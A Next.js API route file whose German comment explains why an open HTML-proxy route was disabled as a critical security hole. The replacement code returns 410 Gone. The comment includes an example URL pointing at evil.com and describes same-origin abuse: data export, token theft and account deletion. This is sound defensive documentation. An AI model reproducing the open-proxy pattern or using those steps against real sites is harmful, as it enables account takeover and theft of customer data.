/**
 * GET /api/picker-bridge — DEAKTIVIERT.
 *
 * ============================================================================
 * ENTFERNT AUS SICHERHEITSGRÜNDEN (Plan SEC-02, Schweregrad Kritisch).
 * ============================================================================
 *
 * Die Route nahm einen `?url=`-Parameter entgegen, fetchte die Zielseite
 * serverseitig und gab das fremde HTML mit `Content-Type: text/html`
 * **unter der eigenen Origin** zurück. Sie hatte:
 *
 *   - keine Authentifizierung (kein getApiUser, kein getSessionUser)
 *   - kein Rate-Limit
 *   - keine SSRF-Prüfung (lib/ssrf.ts existiert, wurde hier nicht importiert)
 *   - keine CSP — die CSP in next.config.ts gilt nur für
 *     `/((?!api|_next).*)`, also ausdrücklich NICHT für /api/*
 *
 * `https://www.getvariante.com/api/picker-bridge?url=https://evil.com` lieferte
 * damit beliebige Angreiferseiten unter der Produktdomain aus. Deren JavaScript
 * lief same-origin und konnte:
 *
 *   - `fetch('/api/profile/export', {credentials:'include'})` → vollständiger
 *     Datenexport des eingeloggten Kunden
 *   - `POST /api/token/regenerate` → API-Token rotieren und abgreifen
 *   - `DELETE /api/profile` → fremden Account löschen
 *   - als Phishing-Seite unter der eigenen Domain samt gültigem TLS dienen
 *
 * Zusätzlich war es ein offener Proxy: jeder im Internet konnte die
 * Vercel-Function unbegrenzt fremde Seiten fetchen lassen.
 *
 * Die Funktion war ein Komfort-Feature für den Element-Picker. Der dokumentierte
 * Weg — Snippet auf der eigenen Seite installieren, dann `?ab_pick=` — funktioniert
 * ohne sie. Der Aufrufer (StepUrlAndElement.tsx) öffnet die Kundenseite jetzt direkt.
 *
 * Falls die Bridge zurückkommen soll, müssen ALLE vier Punkte gleichzeitig
 * erfüllt sein (siehe Plan SEC-02):
 *   1. Auth + Besitzprüfung: Ziel-URL muss zu einer `verified` Domain des
 *      Users gehören.
 *   2. isBlockedHost() auf Ziel-Host UND auf res.url nach Redirects.
 *   3. Rate-Limit pro User.
 *   4. Ausgabe auf einer Cookie-freien Sandbox-Domain, nicht unter der
 *      Produkt-Origin.
 */

export async function GET() {
  return new Response(
    JSON.stringify({
      error: 'gone',
      message:
        'The picker bridge has been removed. Install the snippet on your site and use the built-in picker instead.',
    }),
    {
      status: 410,
      headers: {
        'Content-Type': 'application/json',
        'Cache-Control': 'no-store',
      },
    }
  )
}
